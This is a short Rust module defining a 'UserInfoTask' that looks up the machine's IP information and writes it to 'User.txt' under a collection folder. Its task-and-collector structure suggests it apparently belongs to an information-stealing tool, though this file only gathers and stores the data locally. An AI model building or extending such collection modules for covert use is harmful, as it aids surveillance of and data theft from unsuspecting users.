use crate::alloc::borrow::ToOwned;
use alloc::format;
use collector::Collector;
use filesystem::path::Path;
use filesystem::{FileSystem, WriteTo};
use ipinfo::unwrapped_ip_info;
use tasks::{parent_name, Task};

pub(super) struct UserInfoTask;

impl<C: Collector, F: FileSystem> Task<C, F> for UserInfoTask {
    parent_name!("User.txt");

    fn run(&self, parent: &Path, filesystem: &F, _: &C) {
        let ip_info = unwrapped_ip_info();

        let _ = format!("{ip_info}").write_to(filesystem, parent);
    }
}
